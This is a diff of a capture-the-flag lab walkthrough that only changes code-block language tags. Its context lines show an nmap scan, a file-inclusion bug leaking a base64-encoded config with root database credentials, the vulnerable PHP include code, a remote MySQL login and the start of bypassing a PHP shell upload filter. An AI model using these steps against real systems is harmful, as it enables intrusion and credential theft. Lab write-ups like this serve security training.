@@ -8,7 +8,7 @@ Another lab taken from [abatchy's list](https://www.abatchy.com/2017/02/oscp-lik
 
 An all port scan gives:
 
-```
+```bash
 kali@kali:~$ nmap -p- 192.168.1.70
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 01:13 EDT
 Nmap scan report for 192.168.1.70
@@ -48,7 +48,7 @@ Using a filter, when the site loaded the local resource (it would still only wor
 
 This prints the string on the page: `PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+` which decodes to (I used burp decoder):
 
-```
+```php
 <?php
 $server	  = "localhost";
 $username = "root";
@@ -61,7 +61,7 @@ These credentials will be useful in the next step.
 
 Additionally, I can decode the relevant section of index.php to see how this all works:
 
-```
+```php
 if (isset($_GET['page']))
 	{
 		include($_GET['page'].".php");
@@ -72,7 +72,7 @@ if (isset($_GET['page']))
 
 I can use the credentials above to log into mysql remotely (`mysql -h <ip> -u root -p` plus the password from above). It contained a single table of note, containing the users for the site with encoded passwords:
 
-```
+```bash
 MySQL [Users]> select * from users;
 +------+------------------+
 | user | pass             |
@@ -86,7 +86,7 @@ MySQL [Users]> select * from users;
 
 The encoding is obviously base64, though I can determine this for sure using the trick above to get the login page source code:
 
-```
+```php
 $luser = $_POST['user'];
 $lpass = base64_encode($_POST['pass']);
 
@@ -99,7 +99,7 @@ Choosing kane (obviously, my Brotherhood of Nod allegience is strong), his passw
 
 After logging in, I can access the upload screen. An obvious first test is whether I can just upload a PHP shell, but it fails. Just renaming the shell also fails, so I grab the source from the upload page via the above technique:
 
-```
+```php
  <?php
 session_start();
 if (!isset($_SESSION['user'])) { die('You must be log in.'); }
